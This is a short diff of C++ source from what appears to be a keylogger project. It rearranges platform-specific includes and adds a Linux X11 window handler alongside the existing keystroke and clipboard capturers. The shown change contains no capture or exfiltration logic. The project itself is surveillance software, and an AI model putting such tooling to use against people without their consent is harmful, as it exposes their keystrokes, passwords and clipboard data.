@@ -1,16 +1,19 @@
 #include "FileLogger.h"
-#include "KeycodeMapperEnUs.h"
-#include "KeycodeMapperEnUsX11.h"
 #include "SandboxListener.h"
 #include "StdoutLogger.h"
 
 #ifdef _WIN32
+    #include "KeycodeMapperEnUs.h"
+
     #include "ClipboardHandlerWindows.h"
     #include "KeystrokeCapturerWindows.h"
     #include "WindowHandlerWindows.h"
 #elif defined(__linux__)
+    #include "KeycodeMapperEnUsX11.h"
+
     #include "ClipboardHandlerLinuxX11.h"
     #include "KeystrokeCapturerLinuxX11.h"
+    #include "WindowHandlerLinuxX11.h"
 
     #include <X11/Xlib.h>
 #endif
@@ -149,6 +152,7 @@ available keycode maps:\n\
     XInitThreads();
     clipboard = new Keylogger::ClipboardHandlerLinuxX11();
     capturer = new Keylogger::KeystrokeCapturerLinuxX11();
+    window = new Keylogger::WindowHandlerLinuxX11();
 #endif
 
     if (keycodesLog) {
